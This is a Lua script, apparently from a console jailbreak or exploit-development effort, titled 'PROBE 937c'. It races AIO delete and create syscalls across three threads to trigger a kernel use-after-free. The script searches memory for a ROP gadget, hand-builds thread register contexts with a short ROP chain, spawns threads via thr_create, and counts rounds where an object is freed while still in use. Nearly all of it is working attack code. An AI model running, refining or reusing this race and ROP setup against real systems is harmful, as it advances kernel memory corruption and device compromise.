-- CRASH_CLASS: HIGH
-- PROBE 937c: three actor aio delete race (child frees, child reallocates, parent deletes)
--
-- Context: 937b established two harness facts that change the design.
--   1. The thread context registers are what the FIRST syscall uses; the chain
--      placed at RSP runs only after that call returns.  937b's child therefore
--      deleted twice and its second 662 returned ESRCH.
--   2. A child started with thr_create reaches its syscall before the parent's
--      next syscall does: the parent's 662 got ESRCH in every round while the
--      poll microseconds earlier had just reported state 3.
--
-- So the three roles are split across three actors, each issuing exactly one
-- syscall from preloaded registers:
--   child A : 662(idsP, 1, stA)                 -- frees the slot
--   child B : 669(0x1001, reqs, 1, 3, idsB)     -- takes the freed slot (LIFO)
--   parent  : 662(idsP, 1, stP)                 -- the deleter whose lock window
--                                                  is described by the 14.20 note
-- The parent deletes last, so if its lookup happens before A frees, it is the
-- one in the dropped-lock window and B's fresh object is what its re-lookup
-- finds -- on 14.10 with no generation check on that second lookup, per the fix
-- description.  A clean run is 0 rounds; the interesting outcome is a round
-- where the parent's delete returns 0 (it freed a live object it did not create)
-- or where the next poll on B's id faults.

print("=== PROBE 937c: THREE ACTOR AIO DELETE RACE ===")
print("")

local function to_num(v)
    if type(v) == "table" then
        if v.tonumber then local n = v:tonumber() if n then return n end end
        if v.h then return v.h * 4294967296 + v.l end
    end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function rd(a) local o, v = pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end return nil end
local function rq(a) local o, v = pcall(function() return memory.read_qword(a) end); if o then return v end return nil end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function zero(a, n) pcall(function() for i = 0, n - 4, 4 do memory.write_dword(a + i, 0) end end) end

local fn = to_num(syscall.pipe.fn_addr)
print("[0] pid=" .. tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20))))

local info = memory.alloc(0x200); wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local ebase = (rd(info + 0x10C) or 0) * 4294967296 + (rd(info + 0x108) or 0)

local function find_pat(base, limit, pat)
    local off = 0
    while off < limit do
        local want = limit - off
        if want > 0x1000 then want = 0x1000 end
        local ok, s = pcall(function() return memory.read_buffer(base + off, want) end)
        if not ok or type(s) ~= "string" then return nil end
        local i = string.find(s, pat, 1, true)
        if i then return base + off + i - 1 end
        off = off + want
    end
end
local pop_rax = find_pat(ebase, 0x494000, string.char(0x58, 0xC3))
print(string.format("[0] pop_rax=%s", tostring(pop_rax)))
if not pop_rax then print("[0] no gadget, abort") return end

local PAGE = 0x4000
local function mmap(px)
    local _, a = pcall(function() return mk(477)(uint64(0), uint64(px), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
    local v = to_num(a)
    if v ~= 0 then zero(v, px) end
    return v
end

local idsP = mmap(PAGE)
local stP  = mmap(PAGE)
local stA  = mmap(PAGE)
local reqs = mmap(PAGE)
local poll = mmap(PAGE)
local idsB = mmap(PAGE)
local blockA = mmap(PAGE * 2)
local blockB = mmap(PAGE * 2)
local startA = blockA + PAGE * 2 - 0x200
local startB = blockB + PAGE * 2 - 0x200
local ctxA = memory.alloc(0x500)
local ctxB = memory.alloc(0x500)
local tbA = memory.alloc(8)
local tbB = memory.alloc(8)
local ts = memory.alloc(16)

local function sleep_ms(ms)
    wq(ts, uint64(0)); wq(ts + 8, uint64(ms * 1000000))
    pcall(function() mk(240)(uint64(ts), uint64(0)) end)
end

local Ctx = { MAGIC = 0x108, TYPE = 0x110, CS = 0x0C0, RIP = 0x0E0, RSP = 0x0F8, SS = 0x100,
              RDI = 0x048, RSI = 0x050, RDX = 0x058, RCX = 0x060, R8 = 0x068, RAX = 0x078 }

local function build_ctx(ctx, start, rdi, rsi, rdx, rcx, r8, rax)
    -- exit chain only: pop_rax; 431; fn
    wq(start, uint64(pop_rax)); wq(start + 8, uint64(431)); wq(start + 16, uint64(fn))
    zero(ctx, 0x500)
    wq(ctx + Ctx.MAGIC, uint64(0x480)); wq(ctx + Ctx.TYPE, uint64(0x10000))
    wq(ctx + Ctx.CS, uint64(0x43)); wq(ctx + Ctx.SS, uint64(0x3B))
    wq(ctx + Ctx.RIP, uint64(fn)); wq(ctx + Ctx.RSP, uint64(start))
    wq(ctx + Ctx.RDI, uint64(rdi)); wq(ctx + Ctx.RSI, uint64(rsi))
    wq(ctx + Ctx.RDX, uint64(rdx)); wq(ctx + Ctx.RCX, uint64(rcx))
    wq(ctx + Ctx.R8, uint64(r8)); wq(ctx + Ctx.RAX, uint64(rax))
end

local function spawn(ctx, tb)
    wq(tb, uint64(0))
    local ok, rv = pcall(function() return mk(430)(uint64(ctx), uint64(tb), uint64(0)) end)
    return ok, rv
end

local ROUNDS = 150
local both = 0
local aOnly = 0
local pOnly = 0
local neither = 0
for round = 1, ROUNDS do
    zero(idsP, 0x40)
    local okC, rvC = pcall(function() return mk(669)(uint64(0x1001), uint64(reqs), uint64(1), uint64(3), uint64(idsP)) end)
    local x = rd(idsP)
    if round <= 3 then print(string.format("-- round %d [C] create rv=%d id=%s", round, to_num(rvC), tostring(x))) end
    if not x or x == 0 then break end

    zero(poll, 0x40)
    local _, rvP = pcall(function() return mk(664)(uint64(idsP), uint64(1), uint64(poll)) end)


    zero(stA, 0x40); zero(idsB, 0x40); zero(stP, 0x40)
    build_ctx(ctxA, startA, idsP, 1, stA, 0, 0, 662)          -- delete
    build_ctx(ctxB, startB, 0x1001, reqs, 1, 3, idsB, 669)    -- create
    local ok1, rv1 = spawn(ctxA, tbA)
    local ok2, rv2 = spawn(ctxB, tbB)


    local okD, rvD = pcall(function() return mk(662)(uint64(idsP), uint64(1), uint64(stP)) end)
    local stPv = rd(stP)

    sleep_ms(20)
    local b = rd(idsB)
    local sa = rd(stA)
    local aok = (sa == 0)
    local pok = (stPv == 0)
    if aok and pok then
        both = both + 1
        print(string.format("!! round %d BOTH-ZERO A=%s P=%s B_canary_id=%s", round, tostring(sa), tostring(stPv), tostring(b)))
    elseif aok then aOnly = aOnly + 1
    elseif pok then
        pOnly = pOnly + 1
        print(string.format("!! round %d PARENT-ONLY-ZERO A=%s P=%s B=%s", round, tostring(sa), tostring(stPv), tostring(b)))
    else neither = neither + 1 end
    if b and b ~= 0 and (aok and pok) then
        zero(poll, 0x40)
        local okQ, rvQ = pcall(function() return mk(664)(uint64(idsB), uint64(1), uint64(poll)) end)
        print(string.format("   [Q] poll(B) rv=%s st=%s", tostring(to_num(rvQ)), tostring(rd(poll))))
    end
end

print(string.format("[Z] rounds=%d both=%d aOnly=%d pOnly=%d neither=%d", ROUNDS, both, aOnly, pOnly, neither))
print(string.format("[Z] alive pid=%s", tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20)))))
print("")
print("=== PROBE 937c COMPLETE ===")
